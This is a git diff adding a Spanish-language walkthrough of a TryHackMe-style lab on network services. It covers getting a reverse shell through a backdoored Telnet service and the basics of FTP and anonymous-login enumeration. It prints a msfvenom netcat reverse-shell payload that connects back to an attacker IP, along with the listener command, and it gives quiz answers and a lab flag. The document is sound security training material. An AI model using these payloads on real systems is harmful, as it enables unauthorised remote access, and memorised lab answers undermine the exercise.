@@ -308,3 +308,153 @@ Siempre tome nota de la información que encuentre durante su etapa de enumeraci
 ## Explotando Telnet
 ### Tipos de exploit de telnet
 Telnet, siendo un protocolo, es inseguro por las razones por las que hablamos anteriormente. Carece de cifrado, por lo que envía toda la comunicación sobre texto sin formato y, en su mayor parte, tiene un control de acceso deficiente. Sin embargo, hay CVE para sistemas de clientes y servidores de Telnet, por lo que al explotar puede verificar los que están en:
+
+- [cvedetails.com](https://www.cvedetails.com/)
+- [cve.mitre.org](https://cve.mitre.org/)
+
+CVE (Common Vulnerabilities and Exposures); Vulnerabilidades y exposiciones comunes, se trata de una lista de fallas de seguridad informática divulgadas públicamente. Cuando alguien se refiere a un CVE, generalmente se refiere al número de identificación de CVE asignado a una falla de seguridad.
+
+Sin embargo, es mucho más probable que encuentre una configuración incorrecta en la forma en que se ha configurado o está operando Telnet que le permitirá explotarlo.
+
+### Desgloce del método
+Entonces, desde nuestra etapa de enumeración, sabemos:
+
+- Hay un servicio Telnet mal oculto ejecutándose en esta máquina.
+- El servicio en sí está marcado como "backdoor"
+- Tenemos un posible nombre de usuario de "Skidy" implicado
+
+Usando esta información, intentemos acceder a este puerto Telnet y usarlo como punto de apoyo para obtener un `shell inverso` completo en la máquina.
+
+### Conexión a Telnet
+Puede conectarse a un servidor Telnet con el comando `telnet [ip] [puerto]`; vamos a tener esto en cuenta mientras intentamos explotar esya máquina.
+
+### ¿Qué es un shell inverso?
+
+<img align="center" src="https://4rleki-ing.github.io/TryH4ckm3.github.io/assets/images/Servicios-de-Red/Shell-Inverso.png">
+
+Un `shell` puede describirse simplemente como un fragmento de código o programa que puede usarse para obtener la ejecución de código o comando en un dispositivo.
+
+Un `shell inverso` es un tipo de shell en el que la máquina destino se comunica con la máquina atacante. La máquina atacante tiene un puerto de escucha, en el que recibe la conexión, lo que da como resultado la ejecución del código o comando.
+
+### Responda las preguntas a continuación
+Bien, ¡intentemos conectarnos a este puerto telnet! Si se queda atascado, observe la sintaxis de conexión descrita anteriormente.
+
+```text
+┌──(kali㉿kali)-[~/Desktop/4rlekiing]
+└─$ telnet 10.10.44.110 8012            
+Trying 10.10.44.110...
+Connected to 10.10.44.110.
+Escape character is '^]'.
+SKIDY'S BACKDOOR. Type .HELP to view commands
+```
+
+- ¡Genial!¡Es una conexión telnet abierta!¿Qué mensaje de bienvenida recibimos? `SKIDY'S BACKDOOR`
+- Intentemos ejecutar algunos comandos, ¿obtenemos un retorno en cualquier entrada que ingresemos en la sesión telnet? (Y/N) `N`
+
+Mmm... eso es extraño. Verifiquemos si lo que estamos escribiendo se está ejecutando como un comando del sistema.
+
+Inicie un receptor tcpdump en su máquina local. Si utiliza su propia máquina con la conexión OpenVPN, utilice `sudo tcpdump ip proto \\icmp -i tun0`; si utiliza AttackBox, utilice `sudo tcpdump ip proto \\icmp -i ens5`. Esto inicia un receptor de tcpdump, que escucha específicamente el tráfico ICMP, sobre el que operan los pings.
+
+Ahora, utilice el comando `ping [local THM ip] -c 1` a través de la sesión telnet para ver si podemos ejecutar comandos del sistema. ¿Recibimos algún ping? Tenga en cuenta que debe anteponer .RUN (Y/N) `Y`
+
+```text
+.RUN ping 10.8.19.85 -c 1
+```
+
+¡Genial! Esto significa que podemos ejecutar comandos del sistema y que podemos llegar a nuestra máquina local. ¡Ahora, divirtámonos un poco!
+
+Vamos a generar una carga útil de shell reversa utilizando msfvenom. Esto generará y codificará un shell inverso netcat para nosotros. Aquí está nuestra sintaxis:
+
+```cmd
+msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R
+```
+
+Donde:
+- `-p`: payload
+- `lhost`: nuestra dirección IP de host local (esta es la dirección IP de su máquina)
+- `lport`: el puerto para escuchar (este es el puerto de su máquina)
+- `R`: exportar el payload en formato sin formato
+
+- ¿Con qué palabra comienza el payload generado? `mkfifo`
+
+```text
+┌──(kali㉿kali)-[~/Desktop/4rlekiing]
+└─$ msfvenom -p cmd/unix/reverse_netcat lhost=10.8.19.85 lport=4444 R
+[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
+[-] No arch selected, selecting arch: cmd from the payload
+No encoder specified, outputting raw payload
+Payload size: 88 bytes
+mkfifo /tmp/wzby; nc 10.8.19.85 4444 0</tmp/wzby | /bin/sh >/tmp/wzby 2>&1; rm /tmp/wzby
+```
+
+Perfecto. Ya casi estamos. Ahora todo lo que necesitamos hacer es iniciar un receptor netcat en nuestra máquina local. Hacemos esto usando:
+
+```text
+nc -lvp 4444
+```
+
+- ¿Cómo se vería el comando para el puerto de escucha que seleccionamos en nuestro payload? `nc -lvp 4444`
+
+¡Genial! Ahora que se está ejecutando, necesitamos copiar y pegar nuestro payload msfvenom en la sesión telnet y ejecutarlo como un comando. Con suerte, ¡esto nos dará un shell en la máquina destino!
+
+- ¡Éxito!¿Cuál es el contenido de flag.txt? `THM{y0u_g0t_th3_t3ln3t_fl4g}`
+
+## FTP
+
+<img align="center" src="https://4rleki-ing.github.io/TryH4ckm3.github.io/assets/images/Servicios-de-Red/FTP.png">
+
+El Protocolo de Transferencia de Archivos (FTP) es, como sugiere su nombre, un protocolo utilizado para permitir la transferencia remota de archivos a través de una red. Utiliza un modelo cliente-servidor para hacer esto y, como veremos más adelante, transmite comandos y datos de una manera muy eficiente.
+
+### ¿Cómo funciona FTP?
+Una sesión FTP típica opera utilizando 2 canales:
+- un canal de comandos (a veces llamado canal de control)
+- un canal de datos
+
+Como sus nombres lo indican, el canal de comandos se utiliza para transmitir comandos, así como respuestas a esos comandos, mientras que el canal de datos se utiliza para transferir datos. FTP opera utilizando un protocolo cliente-servidor. El cliente inicia una conexión con el servidor, el servidor valida las credenciales de inicio de sesión proporcionadas y luego abre la sesión. Mientras la sesión esté abierta, el cliente puede ejecutar comandos FTP en el servidor.
+
+### Activo vs Pasivo
+El servidor FTP puede admitir conexiones Activas, Pasivas o ambas.
+
+- En una conexión activa, el cliente abre un puerto y escucha. El servidor debe conectarse activamente a él.
+- En una conexión FTP pasiva, el servidor abre un puerto y escucha (de forma pasiva) y el cliente se conecta a él.
+
+Esta separación de la información de comandos y datos en canales separados es una forma de poder enviar comandos al servidor sin tener qye esperar a qye finalice la transferencia de datos actual. Si ambos canales estuvieran interconectados, solo podría ingresar comandos entre transferencia de datos, lo que no sería eficiente ni para las transferencias de archivos grandes ni para conexiones lentas a Internet.
+
+### Más detalles
+Puede encontrar más detalles sobre la función técnica y la implementación de FTP en el sitio web de [Engineering Task Force](https://www.ietf.org/rfc/rfc959.txt). El IETF es una de las varias agencias de estándares que definen y regulan los estándares de Internet.
+
+### Responda las preguntas a continuación
+- ¿Qué modelo de comunicaciones utiliza FTP? `client-server`
+- ¿Cuál es el puerto FTP estándar? `21`
+- Cuántos modos de conexión FTP existen? `2`
+
+## Enumeración de FTP
+Antes de comenzar, asegúrese de implementar la sala y darle un tiempo para que arranque. Tenga en cuenta que esto puede llevar hasta 5 minutos, así que tenga paciencia.
+
+### Enumeración
+A esta altura, no creo que sea necesario explicar más sobre la enumeración; es clave al atacar servicios y protocolos de red. A esta altura, ya debería tener suficiente experiencia con nmap para poder escanear puertos de manera efectiva. Si se queda atascado al usar alguna herramienta, siempre puede usar `tool [-h / -help / --help]` para obtener más información sobre su función y sintaxis. De igual modo, las páginas `man` son extremadamente útiles para este propósito. Se puede acceder a ellas usando ``man [tool]`.
+
+### Método
+Vamos a explotar un inicio de sesión FTP anónimo para ver a qué archivos podemos acceder y si contienen alguna información que pueda permitirnos abrir un shell en el sistema. Esta es una vía común en los desafíos CTF e imita una implementación descuidada de servidores FTP en la vida real.
+
+### Recursos
+Como vamos a iniciar sesión en un servidor FTP, tendremos que asegurarnos de que haya un cliente FTP instalado en el sistema. Debería haber uno instalado de forma predeterminada en la mayoría de los sistemas operativos Linux, como kali o Parrot OS. Puede comprobar si hay uno escribiendo `ftp` en la consola. Si aparece un mensaje que dice `ftp>`, entonces tiene un cliente FTP en funcionamiento en su sistema. Si no, es una cuestión sencilla de utilizar `sudo apt install ftp` para instalar uno.
+
+### Métodos de enumeración alternativos
+Vale la pena señalar que algunas versiones vulnerables de in.ftpd y otras variantes del servidor FTP devuelven respuestas diferentes al comando `cwd` para los directorios de inicio que existen y los que no. Esto se puede explotar porque se pueden emitir comandos cwd antes de la autenticación y, si hay un directorio de inicio, es más probable que haya una cuenta de usuario que lo acompañe. Si bien este error se encuentra principalmente en sistemas heredados, vale la pena conocerlo como una forma de explotar el FTP. Esta vulnerabilidad está documentada en [Exploit-db.com](https://www.exploit-db.com/exploits/20745).
+
+Ahora que conocemos nuestra caja de herramientas, hagámoslo.
+
+### Responda las preguntas a continuación
+- Ejecute un análisis de nmap de su elección.
+- ¿Cuántos puertos están abiertos en la máquina destino?
+- ¿En qué puerto se está ejecutando FTP?
+- ¿Qué variante de FTP se está ejecutando en él?
+
+Genial, ahora que sabemos con qué tipo de servidor FTP estamos tratando, podemos verificar si podemos iniciar sesión de forma anónima en el servidor FTP. Podemos shacer esto escribiendo `ftp [IP]` en la consola e ingresando `anonymous` y sin contraseña cuando se nos solicite.
+
+- ¿Cuál es el nombre del archivo en el directorio FTP anónimo?
+- ¿Cuál creemos que podría ser un posible nombre de usuario?
+
+¡Genial! Ahora tenemos detalles sobre el servidor FTP y, fundamentalmente, un posible nombre de usuario. Veamos qué podemos hacer con eso...
+
